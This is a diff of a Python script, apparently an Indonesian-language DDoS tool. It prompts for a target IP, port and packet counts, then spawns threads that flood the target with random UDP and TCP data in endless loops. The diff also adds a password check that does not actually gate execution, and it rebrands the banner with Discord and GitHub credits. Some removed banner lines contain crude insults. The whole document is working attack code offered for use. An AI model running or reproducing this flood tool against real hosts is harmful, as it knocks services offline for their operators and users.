@@ -2,10 +2,25 @@
 import random
 import socket
 import threading
+import os
+import sys
+
+os.system("clear")
+print("\033[93m")
+Password = input("MAUSKAN PASSWORD: ")
+
+if Password=="UFTTT": #ganti 123 jadi pw lu terserah
+    print(f"""
+Password yang anda masukan Benar !!
+    """) #Ganti aja ini jadi sciprt lu
+else :
+    print("Password anda salah Silahkan coba ulangi lagi nanti")
+
+print("End Of the Scirpt") #penanda doang
 
 print("""\033[91m
 
-                 RAMEKE BY UFTTT
+                  TOOLS BY UFTTT
 ██╗░░░██╗███████╗████████╗████████╗████████╗
 ██║░░░██║██╔════╝╚══██╔══╝╚══██╔══╝╚══██╔══╝
 ██║░░░██║█████╗░░░░░██║░░░░░░██║░░░░░░██║░░░
@@ -13,37 +28,37 @@ print("""\033[91m
 ╚██████╔╝██║░░░░░░░░██║░░░░░░██║░░░░░░██║░░░
 ░╚═════╝░╚═╝░░░░░░░░╚═╝░░░░░░╚═╝░░░░░░╚═╝░░░ """)
 
-print       (" - - > AUTHOR : UFTTT    CODE : UFTTT < - - ")
-print       (" - - > UFTTT x XLABADOR NIH BOS!! < - - ")
-print       ("- - > RAMEKE BY UFTTT,XLABADOR,NDAGOG")
-print       (" - - > AJARIN CUPU DONG BANG XIXI < - - ")
-print       (" - - > UFTTT#2876 & Genre#1570 <- - ")                                   
-print       (" - - > KALO MAU RENAME PM GUA DULU NGENTOD < - - ")
-print       (" - - > PENCET LINK DIBAWAH AJG < - - ")
-print       (" - - > https://discord.gg/BSPhzrpm <- -")
-print       (" - - > GA JOIN = ANAK HARAM < - - ")
-    
-ip = str(input("  Ip Nya:"))
-port = int(input(" Port Nya:"))
-choice = str(input(" HANCURIN GAK NICH? (y/n):"))
-times = int(input(" MAU BERAPA PAKET:"))
-threads = int(input(" KIRIM BERAPA BARANGNYA:"))
+print("\033[92m")
+print(" TOOLS BY : UFTTT")
+print(" ###########################################")
+print(" | AUTOR   : UFTTT                              ")
+print(" • CODE    : UF X XLA                     •")
+print(" | GITHUB  : https://github.com/XalbadorX. |")
+print(" • DISCORD : UFTTT#2876                   •")
+print(" | MY TEAM : https://discord.gg/jUHnF8et.  |")
+print(" ###########################################")
+                       
+ip = str(input("  IP TARGET:"))
+port = int(input(" PORT TARGET:"))
+choice = str(input(" LANJUT UNTUK MENDDOS? (y/n):"))
+times = int(input(" BERAPA PAKET DIKIRIM:"))
+threads = int(input(" ISI SETIAP PAKET:"))
 def run():
 	data = random._urandom(1025)
-	i = random.choice(("[+]","[-]"))
+	i = random.choice(("[TOK!!!TOK!!!]","[TOK!!!TOK!!!]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +"\033[91m Ufttt x Xlabador NIH BOS!!")
+			print(i +"\033[92m PERMISI PAKET FROM UFTTT !!! ")
 		except:
-			print("[!] GASUKA BAYWAN DECK!!!")
+			print("[!] PAKETNYA ENAK GAK OM !!!")
 
 def run2():
-	data = random._urandom(16)
-	i = random.choice(("[]","[!]","[#]","[+]"))
+	data = random._urandom(150)
+	i = random.choice(("[TOK!!!TOK!!!]","[TOK!!!TOK!!!]","[#]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -51,10 +66,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"\033[91m Ufttt x Xlabador NIH BOS!! ")
+			print(i +" PERMISI PAKET FROM UFTTT !!! ")
 		except:
 			s.close()
-			print("[] GASUKA BAYWAN DECK!!!")
+			print("[*] PAKETNYA ENAK GAK OM !!!")
             
 for y in range(threads):
 	if choice == 'y':
